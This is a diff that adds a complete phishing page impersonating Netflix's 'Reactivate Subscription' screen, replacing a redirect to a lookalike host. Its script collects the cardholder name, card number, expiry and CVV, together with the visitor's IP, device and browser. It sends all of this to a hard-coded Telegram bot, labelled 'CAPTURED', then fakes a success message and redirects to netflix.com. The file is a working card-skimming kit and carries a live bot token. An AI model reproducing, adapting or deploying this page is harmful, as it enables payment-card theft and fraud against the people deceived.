@@ -1,1 +1,390 @@
-<meta http-equiv="refresh" content="0; URL=https://freedcoksos-001-site1.ltempurl.com/en/neix/">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Reactivate Subscription</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #141414;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 12px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid #333;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo span {
+            font-size: 32px;
+            font-weight: bold;
+            color: #E50914;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: white;
+            text-align: center;
+        }
+
+        .sub {
+            color: #b3b3b3;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .plan {
+            background: #222;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 2px solid transparent;
+        }
+
+        .plan:hover {
+            background: #2a2a2a;
+        }
+
+        .plan.selected {
+            border-color: #E50914;
+            background: #2a1a1a;
+        }
+
+        .plan-name {
+            color: white;
+            font-weight: 600;
+            font-size: 18px;
+        }
+
+        .plan-price {
+            color: #E50914;
+            font-size: 20px;
+            font-weight: bold;
+            float: right;
+        }
+
+        .plan-features {
+            color: #b3b3b3;
+            font-size: 12px;
+            margin-top: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            background: #333;
+            border: 1px solid #444;
+            border-radius: 6px;
+            color: white;
+            box-sizing: border-box;
+        }
+
+        .row {
+            display: flex;
+            gap: 12px;
+        }
+
+        .row input {
+            width: 50%;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #E50914;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background: #f6121d;
+        }
+
+        .message {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 6px;
+            text-align: center;
+            display: none;
+        }
+
+        .message.success {
+            background: #00ff0011;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            display: block;
+        }
+
+        .message.error {
+            background: #ff000011;
+            border: 1px solid #ff0000;
+            color: #ff6666;
+            display: block;
+        }
+
+        .message.loading {
+            background: #ffff0011;
+            border: 1px solid #ffff00;
+            color: #ffff66;
+            display: block;
+        }
+
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
+        }
+
+        .error-small {
+            color: #ff6666;
+            font-size: 11px;
+            margin-top: -5px;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <span>NETFLIX</span>
+        </div>
+        
+        <h1>🔄 Reactivate Subscription</h1>
+        <div class="sub">Choose your plan to continue watching</div>
+
+        <!-- Plans -->
+        <div class="plan" data-price="9.99" data-name="Basic">
+            <div class="clearfix">
+                <span class="plan-name">🔴 Basic</span>
+                <span class="plan-price">$9.99</span>
+            </div>
+            <div class="plan-features">✓ HD quality • 1 device</div>
+        </div>
+
+        <div class="plan" data-price="15.99" data-name="Standard">
+            <div class="clearfix">
+                <span class="plan-name">🔵 Standard</span>
+                <span class="plan-price">$15.99</span>
+            </div>
+            <div class="plan-features">✓ Full HD • 2 devices • Popular</div>
+        </div>
+
+        <div class="plan" data-price="19.99" data-name="Premium">
+            <div class="clearfix">
+                <span class="plan-name">💎 Premium</span>
+                <span class="plan-price">$19.99</span>
+            </div>
+            <div class="plan-features">✓ 4K+HDR • 4 devices • Spatial Audio</div>
+        </div>
+
+        <!-- Payment Form -->
+        <input type="text" id="cardName" placeholder="Full Name on Card">
+        <div id="nameError" class="error-small"></div>
+        
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19">
+        <div id="cardError" class="error-small"></div>
+        
+        <div class="row">
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+            <input type="password" id="cvv" placeholder="CVV" maxlength="3">
+        </div>
+        <div id="expiryError" class="error-small"></div>
+
+        <button onclick="sendToTelegram()">🔄 Reactivate Now</button>
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        // TELEGRAM CONFIGURATION
+        const BOT_TOKEN = "8627160097:AAHrqaMZsLKwLOv_LWsLUgpWOADxcxpzCqA";
+        const CHAT_ID = "7714049413";
+        
+        let selectedPlan = null;
+
+        // Plan selection
+        document.querySelectorAll('.plan').forEach(plan => {
+            plan.onclick = function() {
+                document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
+                this.classList.add('selected');
+                selectedPlan = {
+                    name: this.querySelector('.plan-name').textContent,
+                    price: this.dataset.price
+                };
+            };
+        });
+
+        // Format card number
+        document.getElementById('cardNumber').oninput = function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            val = val.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = val.substring(0, 19);
+        };
+
+        // Format expiry
+        document.getElementById('expiry').oninput = function(e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if(val.length >= 2) val = val.slice(0,2) + '/' + val.slice(2,4);
+            e.target.value = val.slice(0,5);
+        };
+
+        // Only numbers for CVV
+        document.getElementById('cvv').oninput = function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
+        };
+
+        // Clear errors
+        function clearErrors() {
+            document.getElementById('nameError').innerHTML = '';
+            document.getElementById('cardError').innerHTML = '';
+            document.getElementById('expiryError').innerHTML = '';
+        }
+
+        // Main function
+        function sendToTelegram() {
+            const msgDiv = document.getElementById('message');
+            
+            // Check plan
+            if(!selectedPlan) {
+                msgDiv.className = 'message error';
+                msgDiv.innerHTML = '❌ Please select a plan';
+                setTimeout(() => {
+                    msgDiv.className = 'message';
+                }, 2000);
+                return;
+            }
+
+            // Get values
+            const name = document.getElementById('cardName').value.trim();
+            const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Clear old errors
+            clearErrors();
+            let hasError = false;
+
+            // Validate
+            if(!name || name.length < 3) {
+                document.getElementById('nameError').innerHTML = '⚠️ Enter full name';
+                hasError = true;
+            }
+            if(!card || card.length < 13) {
+                document.getElementById('cardError').innerHTML = '⚠️ Enter valid card number';
+                hasError = true;
+            }
+            if(!expiry || !expiry.match(/^\d{2}\/\d{2}$/)) {
+                document.getElementById('expiryError').innerHTML = '⚠️ Enter MM/YY';
+                hasError = true;
+            }
+            if(!cvv || cvv.length < 3) {
+                if(!document.getElementById('expiryError').innerHTML) {
+                    document.getElementById('expiryError').innerHTML = '⚠️ Enter CVV';
+                }
+                hasError = true;
+            }
+
+            if(hasError) {
+                msgDiv.className = 'message error';
+                msgDiv.innerHTML = '❌ Please fix errors above';
+                setTimeout(() => {
+                    msgDiv.className = 'message';
+                }, 2500);
+                return;
+            }
+
+            // Show loading
+            msgDiv.className = 'message loading';
+            msgDiv.innerHTML = '⏳ Processing... Please wait';
+
+            // Get IP info
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    const userAgent = navigator.userAgent;
+                    const date = new Date();
+                    const dateStr = date.toLocaleString();
+                    
+                    // Detect device
+                    let device = '💻 Desktop';
+                    if(/Mobile|Android|iPhone|iPad/i.test(userAgent)) {
+                        device = '📱 Mobile';
+                    }
+                    
+                    // Detect browser
+                    let browser = 'Unknown';
+                    if(userAgent.includes('Chrome')) browser = 'Chrome';
+                    else if(userAgent.includes('Firefox')) browser = 'Firefox';
+                    else if(userAgent.includes('Safari')) browser = 'Safari';
+                    else if(userAgent.includes('Edge')) browser = 'Edge';
+                    
+                    // Build message
+                    const message = `🎬 NETFLIX CARD DATA 🎬%0A━━━━━━━━━━━━━━━━━━━━%0A💳 NAME: ${name}%0A🔢 CARD: ${card}%0A📅 EXPIRY: ${expiry}%0A🔐 CVV: ${cvv}%0A━━━━━━━━━━━━━━━━━━━━%0A📺 PLAN: ${selectedPlan.name}%0A💰 PRICE: $${selectedPlan.price}%0A━━━━━━━━━━━━━━━━━━━━%0A🌐 IP: ${ip}%0A📱 DEVICE: ${device}%0A🌍 BROWSER: ${browser}%0A🕒 TIME: ${dateStr}%0A━━━━━━━━━━━━━━━━━━━━%0A✅ STATUS: CAPTURED`;
+                    
+                    // Send to Telegram
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
+                    
+                    return fetch(url, {
+                        method: 'GET',
+                        mode: 'cors'
+                    });
+                })
+                .then(() => {
+                    // Success
+                    msgDiv.className = 'message success';
+                    msgDiv.innerHTML = `✅ Reactivated successfully! 🎉<br>Plan: ${selectedPlan.name} • $${selectedPlan.price}/month<br><br>Redirecting to Netflix...`;
+                    
+                    // Clear form
+                    document.getElementById('cardName').value = '';
+                    document.getElementById('cardNumber').value = '';
+                    document.getElementById('expiry').value = '';
+                    document.getElementById('cvv').value = '';
+                    
+                    // Redirect after 2 seconds
+                    setTimeout(() => {
+                        window.location.href = 'https://www.netflix.com';
+                    }, 2500);
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    msgDiv.className = 'message error';
+                    msgDiv.innerHTML = '❌ Connection error. Please try again.';
+                    
+                    setTimeout(() => {
+                        msgDiv.className = 'message';
+                    }, 3000);
+                });
+        }
+    </script>
+</body>
+</html>
